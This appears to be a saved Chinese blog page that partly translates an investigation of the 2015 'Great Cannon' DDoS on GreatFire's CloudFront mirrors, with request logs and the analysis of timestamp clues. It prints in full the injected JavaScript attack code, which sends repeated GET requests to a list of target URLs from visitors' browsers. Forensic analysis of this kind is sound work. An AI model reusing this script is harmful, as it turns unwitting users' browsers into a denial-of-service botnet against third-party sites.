@@ -1,0 +1,618 @@
+
+ <!DOCTYPE HTML>
+<html >
+<head>
+  <meta charset="UTF-8">
+  
+    <title>The Great Cannon | AzYet&#39;s Notebook</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="PC_Chen">
+    
+
+    
+    <meta name="description" content="听说在GFW之外我们又有一个大杀器GreatCannon， 好奇之下找了一篇文章翻翻，顺便部分翻译了一下。
+　　看完之后的感受是，所谓GreatCannon不过是利用了独有的资源，并没啥高精尖的东西，不过，了解人家分析日志的追踪攻击的过程还挺有意思，当作一次了解运维和安全的机会吧。
+利用百度来操纵百万级电脑发起DDoS　　通过在诸如Amazon的Clound Front这样的大型CDN上部署一组在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The Great Cannon">
+<meta property="og:url" content="http://azyet.github.io/2015/05/22/theGreatCannon/index.html">
+<meta property="og:site_name" content="AzYet's Notebook">
+<meta property="og:description" content="听说在GFW之外我们又有一个大杀器GreatCannon， 好奇之下找了一篇文章翻翻，顺便部分翻译了一下。
+　　看完之后的感受是，所谓GreatCannon不过是利用了独有的资源，并没啥高精尖的东西，不过，了解人家分析日志的追踪攻击的过程还挺有意思，当作一次了解运维和安全的机会吧。
+利用百度来操纵百万级电脑发起DDoS　　通过在诸如Amazon的Clound Front这样的大型CDN上部署一组在">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/55f247cbgw1esdcrz9ffej20hx09lwgv.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/55f247cbgw1esdcr1223pj20ca08yacm.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/55f247cbjw1esddhk4w26j20j10guwgv.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/55f247cbjw1esdeerga2sj20mm0engpl.jpg">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="The Great Cannon">
+<meta name="twitter:description" content="听说在GFW之外我们又有一个大杀器GreatCannon， 好奇之下找了一篇文章翻翻，顺便部分翻译了一下。
+　　看完之后的感受是，所谓GreatCannon不过是利用了独有的资源，并没啥高精尖的东西，不过，了解人家分析日志的追踪攻击的过程还挺有意思，当作一次了解运维和安全的机会吧。
+利用百度来操纵百万级电脑发起DDoS　　通过在诸如Amazon的Clound Front这样的大型CDN上部署一组在">
+<link rel="publisher" href="107081205815475258476">
+
+    
+    <link rel="alternative" href="/atom.xml" title="AzYet&#39;s Notebook" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/avatar_bear.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/avatar_bear.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/avatar_bear.png" alt="AzYet&#39;s Notebook" title="AzYet&#39;s Notebook"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="AzYet&#39;s Notebook">AzYet&#39;s Notebook</a></h1>
+				<h2 class="blog-motto">一些日常，没有复杂的东西</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜單">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:azyet.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2015/05/22/theGreatCannon/" title="The Great Cannon" itemprop="url">The Great Cannon</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/107081205815475258476?rel=author" title="PC_Chen" target="_blank" itemprop="author">PC_Chen</a>
+		
+  <p class="article-time">
+    <time datetime="2015-05-22T14:35:05.000Z" itemprop="datePublished"> 發表於 2015-05-22</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目錄</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用百度来操纵百万级电脑发起DDoS"><span class="toc-number">1.</span> <span class="toc-text">利用百度来操纵百万级电脑发起DDoS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不只是一次普通的攻击"><span class="toc-number">2.</span> <span class="toc-text">不只是一次普通的攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#流量源在哪里"><span class="toc-number">3.</span> <span class="toc-text">流量源在哪里</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寻找恶意代码"><span class="toc-number">4.</span> <span class="toc-text">寻找恶意代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#神秘的时间戳"><span class="toc-number">5.</span> <span class="toc-text">神秘的时间戳</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#“urlQuery-net”看见了恶意代码"><span class="toc-number">6.</span> <span class="toc-text">“urlQuery.net”看见了恶意代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注入代码"><span class="toc-number">7.</span> <span class="toc-text">注入代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#百度分析代码被用来攻击"><span class="toc-number">8.</span> <span class="toc-text">百度分析代码被用来攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#时间戳"><span class="toc-number">8.1.</span> <span class="toc-text">时间戳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#目标"><span class="toc-number">8.2.</span> <span class="toc-text">目标</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#窜改发生在哪里"><span class="toc-number">9.</span> <span class="toc-text">窜改发生在哪里</span></a></li></ol>
+		
+		</div>
+		
+		<p>　　听说在GFW之外我们又有一个大杀器GreatCannon， 好奇之下找了一篇文章翻翻，顺便部分翻译了一下。</p>
+<p>　　看完之后的感受是，所谓GreatCannon不过是利用了独有的资源，并没啥高精尖的东西，不过，了解人家分析日志的追踪攻击的过程还挺有意思，当作一次了解运维和安全的机会吧。</p>
+<h2 id="利用百度来操纵百万级电脑发起DDoS">利用百度来操纵百万级电脑发起DDoS</h2><p>　　通过在诸如Amazon的Clound Front这样的大型CDN上部署一组在线镜像站点，GreatFire.org工程成功地解除中国国内对一些站点的屏蔽。</p>
+<p>　　2015-3-18,项目网站报道前一天遭受了大规模的DOS攻击。这篇文档详细介绍了这次有史以来最大规模的应用层了攻击是如何实施的。</p>
+<p>　　攻击者实现了一种隐秘机制来操作大量的合法流量，境内或境外，来发起和操纵DDOS攻击反审查项目CloundFront和GreatFire.org项目。</p>
+<p>文档揭示了</p>
+<pre><code>访问中国数千网站的全球用户被随机收到恶意代码来实施攻击。
+
+当正常用户加载以下百度服务器dup<span class="class">.baidustatic</span><span class="class">.com</span>, ecomcbjs<span class="class">.jomodns</span><span class="class">.com</span>, cbjs<span class="class">.e</span><span class="class">.shifen</span><span class="class">.com</span>, hm<span class="class">.baidu</span><span class="class">.com</span>, eclick<span class="class">.baidu</span><span class="class">.com</span>, pos<span class="class">.baidu</span><span class="class">.com</span>, cpro<span class="class">.baidu</span><span class="class">.com</span> and hm<span class="class">.e</span><span class="class">.shifen</span><span class="class">.com</span>的资源时，恶意代码以JavaScript的形式发送。
+
+百度的分析代码h.js被替换成恶意代码触发攻击。
+
+恶意代码被无差别地发送给全球任何用户，唯一的目的即发起到CloundFront和GreatFire的攻击
+
+百万级的用户成为攻击目标，转而攻击Amazon的基础设施
+
+窜改发生在来自中国以外的流量访问百度服务器时
+</code></pre><a id="more"></a>
+<h2 id="不只是一次普通的攻击">不只是一次普通的攻击</h2><p>　　18日查看攻击网站的日志，GreatFire在Amazon设施上运行若干镜像站，日志数量很大，我们决定在前一小时内查看“d19r410x06nzy6.cloudfront.net”的日志。</p>
+<p>　　调查试图从500个日志，1亿请求中查找线索，以下是一个请求的样本：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2015</span>-<span class="number">03</span>-<span class="number">18</span> <span class="number">11</span>:<span class="number">52</span>:<span class="number">13</span> JFK1 <span class="number">66.65</span>.x.x</span><br><span class="line">GET /?1425369133</span><br><span class="line">http:<span class="comment">//pos.baidu.com/wh/o.htm?ltr=https://www.google.com/&amp;cf=u</span></span><br><span class="line">Mozilla<span class="regexp">/5.0 (Linux; Android 4.4.4; SM-N910V Build/</span>KTU84P) AppleWebKit<span class="regexp">/537.36 (KHTML, like Gecko) Chrome/</span><span class="number">40.0</span>.2214.109 </span><br><span class="line"><span class="number">2015</span>-<span class="number">03</span>-<span class="number">18</span> <span class="number">11</span>:<span class="number">52</span>:<span class="number">13</span> JFK1 <span class="number">71.175</span>.x.x</span><br><span class="line">GET /?1425369133</span><br><span class="line">http:<span class="comment">//www.17k.com/chapter/471287/1 7884999.html</span></span><br><span class="line">Mozilla<span class="regexp">/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/</span><span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">4</span></span><br></pre></td></tr></table></figure></p>
+<p>　　第一个请求告诉我们18日，一台IP为66.65.x.x的电脑发送了一个Get请求(?1425369133)内容，它由一个在百度中探索google的请求中重定向而来。这个请求被amazon的NY服务器路由进入中国。</p>
+<p>　　日志显示攻击是由分布在全球的电脑发起的，用海量的<code>GET /?142xxxxxxx</code>请求洪泛服务器。</p>
+<p>　　超1千万散布全球的台电脑发送了位于CloundFront的CreatFire服务器，每台电脑只发送了相对较小数量的请求，每小时约1-50个。</p>
+<p>　　请求中像是包含一个时间戳，用于生成一个唯一的随机数，调查后发现时间戳与流量源的时区有关。</p>
+<h2 id="流量源在哪里">流量源在哪里</h2><p>　　Amazon的WEb服务器用最近的国际机场的IATA码命名Edge位置, 日志中的这则信息帮助我们理解了发起这次攻击的电脑的分布。其中70%都在意料中，让人意外的是30%的Edge均匀地散布了全球。<br><img src="http://ww4.sinaimg.cn/large/55f247cbgw1esdcrz9ffej20hx09lwgv.jpg" alt=""><br>　　日志另一有趣的方面是攻击像是在用户访问一个金字塔式的不同站点时生成的。但是9000站点中38%包含了一个或多个百度资源的链接。</p>
+<p>　　19日我们总结出大多数攻击都是由位于全球的中文用户发起的，在不知情的情况下他们在访问中国站点时发起了对CloundFront和GreatFire的攻击。</p>
+<h2 id="寻找恶意代码">寻找恶意代码</h2><p>　　寻找恶意代码是直接的挑战。我们连接了所有可能触发攻击的网站，但两天内一无所获。20日我们找到了第一条线索告诉我们方向是正确的。Google（Cache）在爬sites: <a href="http://www.sctv.cn和http://china.cankaoxiaoxi.com站点时，像是检索了恶意代码。" target="_blank" rel="external">http://www.sctv.cn和http://china.cankaoxiaoxi.com站点时，像是检索了恶意代码。</a></p>
+<p><img src="http://ww3.sinaimg.cn/large/55f247cbgw1esdcr1223pj20ca08yacm.jpg" alt=""></p>
+<p>　　我们集中精力查看上述站点的数十个JavaScript，但是毫无恶意代码的踪迹。</p>
+<h2 id="神秘的时间戳">神秘的时间戳</h2><p>　　第四天的讨论分析，我们调查了1亿个收集的时间戳。我们把每个Amazon CDN Edge中日志中的时间戳规范化，像是Unix的公元计时。</p>
+<p>　　毫无疑问，时间戳是在用户浏览器中计算出的，并且包含一个21600秒的偏移。</p>
+<p>　　这个标号稍后将成为标识恶意代码和攻击者的基础。</p>
+<h2 id="“urlQuery-net”看见了恶意代码">“urlQuery.net”看见了恶意代码</h2><p>　　“Urlquery.net”是一个检测和分析网页恶意软件的服务。网站提供了浏览器在访问一个站点时会有哪些动作的详细信息，供进一步的分析。</p>
+<p>　　我们搜索了“Urlquery.net”，期望它保存了恶意代码，然后我们发现了一份似乎支持我们的假设的有趣的报告。接近百度服务器的“某事物”在用户访问各种网站时向其发送了恶意攻击代码。<br>    <a href="http://urlquery.net/report.php?id=1426672633782" target="_blank" rel="external">http://urlquery.net/report.php?id=1426672633782</a></p>
+<p><img src="http://ww4.sinaimg.cn/large/55f247cbjw1esddhk4w26j20j10guwgv.jpg" alt=""></p>
+<p>　　报告显示，访问<a href="http://zhao.juji123.com时，触发了指向位于cloundFront中站点的请求：" target="_blank" rel="external">http://zhao.juji123.com时，触发了指向位于cloundFront中站点的请求：</a></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/?1425380211HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">Host:</span> d14qqseh1jha6e.cloudfront.net</span><br><span class="line">User-<span class="string">Agent:</span> Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">6.0</span>; Windows NT <span class="number">5.1</span>; .NET C</span><br><span class="line"><span class="string">Accept:</span> text<span class="regexp">/plain, */</span>*; q=<span class="number">0.01</span></span><br><span class="line">Accept-<span class="string">Language:</span> en-us,en;q=<span class="number">0.5</span></span><br><span class="line">Accept-<span class="string">Encoding:</span> gzip,deflate</span><br><span class="line">Accept-<span class="string">Charset:</span> ISO-<span class="number">8859</span>-<span class="number">1</span>,utf-<span class="number">8</span>;q=<span class="number">0.7</span>,*;q=<span class="number">0.7</span></span><br><span class="line">Keep-<span class="string">Alive:</span> <span class="number">115</span></span><br><span class="line"><span class="string">Connection:</span> keep-alive</span><br><span class="line"><span class="string">Referer:</span> <span class="string">http:</span><span class="comment">//pos.baidu.com/wh/o.htm?ltr=&amp;amp;cf=u</span></span><br><span class="line"><span class="string">Origin:</span> <span class="string">http:</span><span class="comment">//pos.baidu.com</span></span><br></pre></td></tr></table></figure>
+<p>　　接下来我我们尝试了连接<a href="http://pos.baidu.comand" target="_blank" rel="external">http://pos.baidu.comand</a> <a href="http://dup.baidustatic.com的一轮测试，依然没有结果。" target="_blank" rel="external">http://dup.baidustatic.com的一轮测试，依然没有结果。</a></p>
+<p>　　我们联系了urlQuery.net，他们查看了一些关于百度服务器的出访cloudfront中网站的报告。在一些随机的响应中有一个非常与众不同的响应。</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.0</span> <span class="number">200</span> OK</span><br><span class="line">Content-<span class="string">Type:</span>text/javascript</span><br><span class="line"><span class="string">Server:</span> Apache</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">1325</span></span><br><span class="line"><span class="string">Connection:</span> keep-alive</span><br></pre></td></tr></table></figure>
+<p>　　一些响应像来来自幽灵Aapche服务器。</p>
+<p>　　以123.125.65.120的ip访问百度服务器和以下域名dup.baidustatic.com, ecomcbjs.jomodns.com and cbjs.e.shifen.com确实有时会返回预期之外的响应。</p>
+<p>　　同样的行为也会在以hm.baidu.com and hm.e.shifen.com域名访问61.135.185.140时出现。</p>
+<p>　　幸运的是，urlQurty保存了这些恶意代码。</p>
+<h2 id="注入代码">注入代码</h2><p>　　触发攻击的Javascript代码很可能是由位于中国基础设施中的透明代理在合法流量连接百度服务器时注入的，恶意代码在h.js中。</p>
+<h2 id="百度分析代码被用来攻击">百度分析代码被用来攻击</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;script src='http://libs.baidu.com/jquery/2.0.0/jquery.min.js'&gt;&lt;\/script&gt;"</span>); </span><br><span class="line">!<span class="built_in">window</span>.jQuery &amp;&amp; <span class="built_in">document</span>.write(<span class="string">"&lt;script src='http://code.jquery.com/jquery-latest.js'&gt;&lt;\/script&gt;"</span>); </span><br><span class="line">startime = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime(); </span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unixtime</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>(); </span><br><span class="line">    <span class="keyword">var</span> ux = <span class="built_in">Date</span>.UTC(dt.getFullYear(), dt.getMonth(), dt.getDay(), dt.getHours(), dt.getMinutes(), dt.getSeconds()) / <span class="number">1000</span>; </span><br><span class="line">    <span class="keyword">return</span> ux; </span><br><span class="line">&#125; </span><br><span class="line">url_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"https://d117ucqx7my6vj.cloudfront.net"</span>, <span class="string">"https://d14qqseh1jha6e.cloudfront.net"</span>, </span><br><span class="line">        <span class="string">"https://d18yee9du95yb4.cloudfront.net"</span>, <span class="string">"https://d19r410x06nzy6.cloudfront.net"</span>, <span class="string">"https://d1blw6ybvy6vm2.cloudfront.net"</span>) </span><br><span class="line">NUM = url_array.length; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">r_send2</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> x = unixtime() % NUM; </span><br><span class="line">    <span class="keyword">var</span> url = url_array[x]; </span><br><span class="line">    get(url); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">(myurl)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> ping; </span><br><span class="line">    $.ajax(&#123; </span><br><span class="line">url: myurl + <span class="string">"?"</span> + unixtime(), </span><br><span class="line">dataType: <span class="string">"text"</span>, </span><br><span class="line">timeout: <span class="number">10000</span>, </span><br><span class="line">cache: <span class="literal">true</span>, </span><br><span class="line">beforeSend: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123; </span><br><span class="line">requestTime = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime(); </span><br><span class="line">&#125;, </span><br><span class="line">complete: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123; </span><br><span class="line">responseTime = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime(); </span><br><span class="line">ping = <span class="built_in">Math</span>.floor(responseTime - requestTime); </span><br><span class="line"><span class="keyword">if</span> (responseTime - startime &lt; <span class="number">300000</span>) &#123; </span><br><span class="line">    r_send(ping); </span><br><span class="line">    count = count + <span class="number">1</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125;); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">r_send</span><span class="params">(ping)</span> </span>&#123; </span><br><span class="line">    setTimeout(<span class="string">"r_send2()"</span>, ping); </span><br><span class="line">&#125; </span><br><span class="line">setTimeout(<span class="string">"r_send2()"</span>, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure>
+<p>　　代码中包含一些与众不同的指纹确认就是这段代码触发了大规模攻击。</p>
+<h3 id="时间戳">时间戳</h3><p>　　时间戳是unixtime()生成的，代码作者犯了一个错误，他误用了getDay()当作getDate()来获取月份中的日期。3月18日GetDay()会返回3,因为是星期三，这就解释了为何我们收到的时间戳会有15天的偏移，这个Bug告诉我们找对了代码！<br><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> unixtime<span class="literal">()</span> &#123; </span><br><span class="line"> var dt = <span class="keyword">new</span> <span class="type">Date</span><span class="literal">()</span>; </span><br><span class="line"> var ux = <span class="type">Date</span>.<span class="type">UTC</span>(dt.getFullYear<span class="literal">()</span>, dt.getMonth<span class="literal">()</span>, dt.getDay<span class="literal">()</span>, dt.getHours<span class="literal">()</span>, dt.getMinutes<span class="literal">()</span>, dt.getSeconds<span class="literal">()</span>) / <span class="number">1000</span>; </span><br><span class="line"> return ux; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="目标">目标</h3><p>　　代码中包含了一个到cloundfront的目标列表，<code>url: myurl + &quot;?&quot; + unixtime()</code> 也符合Get Flooding中的指纹。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"https://d117ucqx7my6vj.cloudfront.net"</span>, <span class="string">"https://d14qqseh1jha6e.cloudfront.net"</span>, </span><br><span class="line"><span class="string">"https://d18yee9du95yb4.cloudfront.net"</span>, <span class="string">"https://d19r410x06nzy6.cloudfront.net"</span>, <span class="string">"https://d1blw6ybvy6vm2.cloudfront.net"</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="窜改发生在哪里">窜改发生在哪里</h2><p>　　我们调查了将流量路由向这些包含恶意代码的站点的自动系统，以下ASN可以访问指向百度站点的流量。</p>
+<p>　　这是一个会发送DDoS启动器的IP和URL列表：<br><img src="http://ww4.sinaimg.cn/large/55f247cbjw1esdeerga2sj20mm0engpl.jpg" alt=""></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/great-cannon/">great cannon</a><a href="/tags/安全/">安全</a><a href="/tags/网络/">网络</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://azyet.github.io/2015/05/22/theGreatCannon/" data-title="The Great Cannon | AzYet&#39;s Notebook" data-tsina="1441941451" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2015/05/24/dynamicProgramming/" title="动态规划实战（一）：理解再实现">
+  <strong>上一篇：</strong><br/>
+  <span>
+  动态规划实战（一）：理解再实现</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2015/05/21/zookeeperNote7/"  title="ZooKeeper学习笔记（七）之方法和解决方案">
+ <strong>下一篇：</strong><br/> 
+ <span>ZooKeeper学习笔记（七）之方法和解决方案
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section id="comments" class="comment">
+	<div class="ds-thread" data-thread-key="2015/05/22/theGreatCannon/" data-title="The Great Cannon" data-url="http://azyet.github.io/2015/05/22/theGreatCannon/"></div>
+</section>
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="顯示側邊欄"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目錄</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用百度来操纵百万级电脑发起DDoS"><span class="toc-number">1.</span> <span class="toc-text">利用百度来操纵百万级电脑发起DDoS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不只是一次普通的攻击"><span class="toc-number">2.</span> <span class="toc-text">不只是一次普通的攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#流量源在哪里"><span class="toc-number">3.</span> <span class="toc-text">流量源在哪里</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寻找恶意代码"><span class="toc-number">4.</span> <span class="toc-text">寻找恶意代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#神秘的时间戳"><span class="toc-number">5.</span> <span class="toc-text">神秘的时间戳</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#“urlQuery-net”看见了恶意代码"><span class="toc-number">6.</span> <span class="toc-text">“urlQuery.net”看见了恶意代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注入代码"><span class="toc-number">7.</span> <span class="toc-text">注入代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#百度分析代码被用来攻击"><span class="toc-number">8.</span> <span class="toc-text">百度分析代码被用来攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#时间戳"><span class="toc-number">8.1.</span> <span class="toc-text">时间戳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#目标"><span class="toc-number">8.2.</span> <span class="toc-text">目标</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#窜改发生在哪里"><span class="toc-number">9.</span> <span class="toc-text">窜改发生在哪里</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隱藏側邊欄"></a></div>
+<aside class="clearfix">
+
+  
+
+  
+<div class="tagslist">
+	<p class="asidetitle">標簽</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/学习笔记/" title="学习笔记">学习笔记<sup>23</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>11</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/算法/" title="算法">算法<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ZooKeeper/" title="ZooKeeper">ZooKeeper<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/rabbitmq/" title="rabbitmq">rabbitmq<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/分布式/" title="分布式">分布式<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/simics/" title="simics">simics<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/android/" title="android">android<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔试题/" title="笔试题">笔试题<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/网络/" title="网络">网络<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IPv6/" title="IPv6">IPv6<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/hindsight/" title="hindsight">hindsight<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Windows/" title="Windows">Windows<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/openstack/" title="openstack">openstack<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/adb/" title="adb">adb<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Win8/" title="Win8">Win8<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/u盘/" title="u盘">u盘<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/外网/" title="外网">外网<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java/" title="java">java<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/启动流程/" title="启动流程">启动流程<sup>2</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情鏈接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://bbs.byr.cn" target="_blank" title="BYR">BYR</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 訂閱</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> A coder in Beijing. <br/>
+			Living a simple life.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/1441941451" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/azyet" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		<a href="https://www.facebook.com/pc.chen.940" target="_blank" class="icon-facebook" title="facebook"></a>
+		
+		
+		
+		
+		<a href="http://www.zhihu.com/people/pc-chen" target="_blank" class="icon-zhihu" title="知乎"></a>
+		
+		
+		<a href="https://plus.google.com/107081205815475258476?rel=author" target="_blank" class="icon-google_plus" title="Google+"></a>
+		
+		
+		<a href="mailto:cgnphe@126.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
